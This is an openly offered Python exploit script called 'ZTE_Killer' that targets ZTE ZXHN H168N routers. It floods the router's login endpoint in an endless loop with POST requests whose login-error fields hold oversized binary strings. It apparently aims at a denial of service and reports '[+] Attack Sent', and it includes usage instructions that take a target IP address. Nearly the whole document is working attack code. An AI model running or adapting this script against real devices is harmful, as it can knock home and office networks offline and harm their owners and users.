#By: Morad Abdelrasheed & Zeyad Azima
import requests,sys,threading

print("""
 __,,..,-             _,.--''------'' |   _____  ______________`''--._-
 \      `\   __..--''                |  /::: / /::::::::::::::\      `\-
  \       `''                        | /____/ /___ ____ _____::|    .  \-
   \        ZTE_Killer         ,.... |            `    `     \_|   ( )  |-
    `.                       /`     `.\ ,,''`'- ,.----------.._     `   |
      `.                     |        ,'       `               `-.      |
        `-._                 \                                    ``.. /
            `---..............>
                             Zeyad Azima & Morad Abdelrasheed
                             This exploit works on: ZXHN H168N
""")

def Start():
    while True:
        try:
            router = sys.argv[1]
            header = {'User-Agen': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
                      'Referer': f'http://{router}/getpage.gch?pid=1002&nextpage=welcome.gch'}

            data = {'TPAction': 'ACTION_USERLOGIN', 'TPActionPre': 'ACTION_USERLOGIN', 'TPUsername': 'azima',
                    'TPPassword': 'Morad',
                    'TPRight': 'N%2FA', 'TPIsLogin': '0',
                    'TPErrLoginNum': '11000001111100001111111010101101010110010101010101010101010101010101010101010101010101010101010101010101010101010100000000111100',
                    'TPErrLoginNumMAX': '1101010101010000111010101010100011000111001100100101000010010011100',
                    'TPErrLoginTimeElapse': '0',
                    'TPLanguage': 'English', 'TPTimeout': '5', 'TPTypeValue': '1', 'TPNextpage': 'welcome.gch',
                    'TPNextpageSupId': 'mmWelcome', 'TPNextpageStaFlag': '0'}
            url = f'http://{router}/getpage.gch?pid=1002&nextpage=welcome.gch'
            r = requests.post(url, verify=True, data=data)
            if r.status_code == 200:
                print("[+] Attack Sent")
        except IndexError:
            print(""""[-] Please Check your target""")
            print("ex: python3 zte_killer.py 192.168.1.1 ")
            exit()



thread = threading.Thread(target=Start())
thread.start()
thread.join()